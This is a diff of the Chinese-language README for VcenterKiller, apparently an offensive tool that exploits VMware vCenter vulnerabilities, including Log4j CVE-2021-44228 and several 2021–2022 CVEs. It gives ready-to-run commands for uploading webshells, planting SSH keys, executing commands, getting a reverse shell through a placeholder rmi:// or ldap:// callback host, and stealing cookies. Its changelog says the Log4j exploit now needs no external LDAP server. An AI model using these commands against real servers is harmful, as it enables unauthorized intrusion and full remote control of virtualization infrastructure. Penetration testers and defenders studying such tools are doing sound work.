@@ -3,21 +3,13 @@
 
 # VcenterKiller
 #### 0.必读
-目前本工具处于刚上线阶段，可能会有很多BUG，如果遇到bug请提issue
-
-
-
-写这个工具单纯是为了方便，它没有什么高大上的东西
-
-
-
-目前集成了对Vcenter log4j漏洞的检测和利用功能，思路来自于带哥[@j5s](https://github.com/j5s)的项目[SuperFastjsonScan](https://github.com/j5s/SuperFastjsonScan)，原理参考[Golang实现RMI协议自动化检测Fastjson](https://www.anquanke.com/post/id/249402)，简单来说就是不借助dnslog之类的平台，只要你和目标主机是通的并且你的主机/跳板没有被防火墙做端口限制，那就能直接验证目标是否进行了远程调用。
+如果遇到bug请提issue，写这个工具单纯是为了方便，它没有什么高大上的东西
 
 
 
 #### 1.它是什么
 
-一款针对Vcenter（暂时）的综合**验证**工具，包含目前最主流的CVE-2021-21972、CVE-2021-21985以及CVE-2021-22005，提供一键上传webshell，命令执行或者上传公钥并使用SSH连接的功能，以及针对Apache Log4j CVE-2021-44228漏洞在Vcenter上的检测以及利用，比如命令执行并获取回显（需要一个ldap恶意服务器）。
+一款针对Vcenter的综合**验证**工具，包含目前最主流的CVE-2021-21972、CVE-2021-21985以及CVE-2021-22005，提供一键上传webshell，命令执行或者上传公钥并使用SSH连接的功能，以及针对Apache Log4j CVE-2021-44228漏洞在Vcenter上的检测以及利用，比如命令执行并获取回显（~~需要一个ldap恶意服务器~~），现在不需要另外启动ldap服务器了，我根据jndi-injection工具手搓了一个利用方式，Vcenter使用的中间件是Tomcat，直接使用TomcatBypass的利用链就行了。
 
 #### 2.它的定位
 
@@ -36,8 +28,7 @@ go build -o main.exe
 ./main.exe -u https://192.168.1.1 -m 21972 -f id_rsa.pub -t ssh //传公钥
 ./main.exe -u https://192.168.1.1 -m 21985 -t rshell -r rmi://xx.xx.xx.xx:1099/xx
 ./main.exe -u https://192.168.1.1 -m log4center -t scan // scan log4j
-./main.exe -u https://192.168.1.1 -m log4center -t rshell -r rmi://xx.xx.xx.xx:1099/xx //get reverseshell and other
-./main.exe -u https://192.168.1.1 -m log4center -t exec -r ldap://xx.xx.xx.xx:1389 -c whoami //execute command
+./main.exe -u https://192.168.1.1 -m log4center -t exec -r ldap://xx.xx.xx.xx:1389 -c whoami //也可以不指定ldap服务
 ./main.exe -u https://xx.xx.com -m 22954 whoami
 ./main.exe -u https://xx.xx.com -m 22972 //get cookie
 ./main.exe -u https://xx.xx.com -m 31656 //If CVE-2022-22972不能用就换CVE-2022-31656
@@ -62,6 +53,7 @@ V1.3.1 修复了检测log4j时忽略了端口的问题，有的服务会更改�
 V1.3.2 修改了针对log4j的利用方式，通过tomcatbypassEcho的方式执行命令并获取回显。vcenter 7.0 linux测试通过。
 V1.3.3 增加了对6.7和7.0版本的区别利用，7.0必须使用tomcatbypass，而6.7使用普通的basic就行了
 v1.3.4 修改了对log4j的验证逻辑，目前的逻辑是循环5次不同payload无差别乱打，有回显就有，没有就没有
+v1.3.5 消除了log4j对Jndi-Injection-Exploit的依赖，能够直接执行命令并获取回显
 ...
 ```
 
